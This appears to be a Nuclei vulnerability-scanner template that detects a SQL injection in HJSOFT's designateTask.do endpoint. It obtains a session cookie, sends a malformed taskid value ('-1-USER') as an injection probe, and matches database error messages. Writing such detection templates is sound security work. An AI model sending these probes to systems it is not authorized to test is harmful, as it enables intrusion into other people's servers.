id: HJSOFT-designateTask-sqlInjection

info:
  name: HJSOFT-designateTask-sqlInjection
  author: iSee857
  severity: high
  description: |
    HJSOFT-designateTask-sqlInjection.

variables:
  jsessionid: ""

http:
  - id: initial-request
    method: GET
    path:
      - "{{BaseURL}}/module/system/qrcard/mobilewrite/qrcardmain.jsp"
    headers:
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.263.139 Safari/537.36"
    matchers:
      - type: status
        status:
          - 200
    extractors:
      - type: regex
        part: header
        name: jsessionid
        internal: true
        regex:
          - "Set-Cookie:\\s*JSESSIONID=([A-F0-9]+)"
        group: 1

  - id: verify-vulnerability
    method: GET
    path:
      - "{{BaseURL}}/performance/objectiveManage/designateTask.do?b_save=&taskid=-1-USER"
    headers:
      Accept-Language: "zh-CN,zh;q=0.9"
      Upgrade-Insecure-Requests: "1"
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36"
      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
      Accept-Encoding: "gzip, deflate"
      Cookie: "JSESSIONID={{jsessionid}}"
      
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "nvarchar"
          - "ORA-01722: 无效数字"
        condition: or